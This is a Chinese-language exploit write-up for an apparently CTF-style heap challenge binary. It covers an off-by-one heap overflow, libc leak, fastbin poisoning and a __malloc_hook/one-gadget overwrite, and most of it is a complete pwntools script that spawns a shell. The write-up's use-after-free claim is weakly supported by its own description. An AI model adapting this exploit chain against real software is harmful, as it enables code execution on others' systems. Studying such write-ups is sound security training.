# 漏洞利用文档

## 执行环境
基于调试记录和程序分析，该二进制程序的运行环境如下：
- **文件类型**：ELF 64位可执行文件，动态链接
- **安全机制**：
  - PIE：启用（程序基址随机化）
  - Stack Canary：启用
  - NX：启用（数据执行保护）
  - RELRO：Partial（部分重定位只读）
- **依赖库**：通过ldd查看，依赖libc等标准库
- **运行要求**：需要在Linux环境下执行，依赖正确的libc版本

## 漏洞成因
### 关键结构体分析
程序使用两个全局数组管理堆块：
- `chunk[50]`：存储堆块指针的数组
- `size[50]`：存储对应堆块大小的数组

### 漏洞类型分析
1. **堆溢出漏洞**：
   - 位置：`edit`函数中的`read(0, (void *)chunk[v1], (unsigned int)(v2 + 1))`
   - 成因：读取字节数为`size[v1] + 1`，导致off-by-one溢出，可能覆盖相邻chunk的元数据

2. **Use-After-Free (UAF)漏洞**：
   - 位置：`delete`函数中free后chunk指针被清零，但size数组未清零
   - 成因：如果通过其他方式访问已释放的chunk，可能导致UAF

3. **元数据破坏**：
   - 通过堆溢出修改chunk的size字段和fd/bk指针，破坏堆管理结构完整性

### 关键内存破坏点
- **堆溢出**：chunk 6溢出覆盖chunk 7的size字段为异常值
- **fastbin污染**：fastbin 0x70链被指向伪造的chunk地址
- **libc泄露**：通过unsortedbin泄露main_arena地址计算libc基址
- **hook覆盖**：最终覆盖__realloc_hook为one-gadget地址

## Exploit
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample25')
elf = ELF('./data/sample25')
libc = elf.libc

def create(ID,size):
    p.sendline(b'1')
    p.sendline(str(ID).encode('utf-8'))
    p.sendline(str(size).encode('utf-8'))

def show(ID):
    p.sendline(b'2')
    p.sendline(str(ID).encode('utf-8'))

def dele(ID):
    p.sendline(b'3')
    p.sendline(str(ID).encode('utf-8'))

def edit(ID,content):
    p.sendline(b'4')
    p.sendline(str(ID).encode('utf-8'))
    p.sendline(content)

# Step 1: 初始堆布局，创建并释放chunk构建fastbin链
create(6,0x10);create(7,0x20);create(8,0x20);create(9,0x40);dele(8);dele(7)

# Step 2: 堆溢出攻击，通过chunk 6溢出修改相邻chunk元数据
payload = b'a'*0x1f;edit(6,payload)

# Step 3: 泄露堆地址，通过显示chunk 6内容计算堆基址
show(6);p.recvuntil(b'to show?Content:');p.recvline();chunk_addr = p.recvline()[:-1];chunk_addr = int.from_bytes(chunk_addr,'little');chunk_addr = chunk_addr - 0x50

# Step 4: 重新布局堆，创建不同大小的chunk为后续利用准备
create(0,0x10);create(1,0xf8);create(2,0x10);create(3,0xf8);create(4,0x40)

# Step 5: 伪造chunk头，在chunk 2中设置伪造的size字段
chunk1_addr = chunk_addr + 0x20+0x30+0x30+0x50+0x20;payload = b'a'*0x10+p64(0x120)+p64(0x100);edit(2,payload)

# Step 6: 触发堆分配，调整堆布局
create(5,0x40)

# Step 7: 设置伪造chunk的元数据，构造unsortedbin链
payload = b'a'*0x10+p64(0)+p64(0x121)+p64(chunk1_addr)+p64(chunk1_addr);edit(0,payload)

# Step 8: 释放chunk触发unsortedbin，泄露libc地址
dele(3)

# Step 9: 重新分配chunk，维持堆布局
create(1,0xf8)

# Step 10: 通过显示chunk 2泄露main_arena地址
show(2);p.recvuntil(b'to show?Content: ');main_area = p.recvline()[:-1];main_area = int.from_bytes(main_area,'little')

# Step 11: 准备fastbin攻击，分配并释放chunk构建0x70 fastbin链
create(10,0x68);dele(10)

# Step 12: 计算libc地址和fake_chunk，修改fastbin指向伪造chunk
libc_addr = main_area - 88 - 0x10 - libc.sym['__malloc_hook'];malloc_hook = libc_addr+libc.sym['__malloc_hook'];fake_chunk = malloc_hook - 0x23;edit(2,p64(fake_chunk))

# Step 13: 分配fake chunk，获取__malloc_hook附近控制权
create(11,0x68);create(13,0x68)

# Step 14: 覆盖hook函数为one-gadget，准备代码执行
ogg = libc_addr + 0x4526a+6;realloc_hook = libc_addr+libc.sym["realloc"];edit(13,b'a'*3+p64(0)+p64(ogg)+p64(realloc_hook+16))

# Step 15: 触发malloc执行shell，完成漏洞利用
create(14,20)

# 交互模式，获取shell控制权
p.interactive()
```

### 漏洞利用关键注释
- **堆布局**：通过精心安排的chunk分配和释放，构造特定的内存布局为利用创造条件
- **地址泄露**：利用堆溢出和UAF泄露堆地址和libc地址，绕过ASLR保护
- **fastbin攻击**：污染fastbin链表实现任意地址分配，最终覆盖hook函数
- **one-gadget**：使用libc中的one-gadget直接获取shell，避免复杂的ROP链构造

该漏洞利用成功结合了堆溢出、UAF和fastbin攻击技术，在存在多种安全机制的环境中实现了可靠的代码执行。
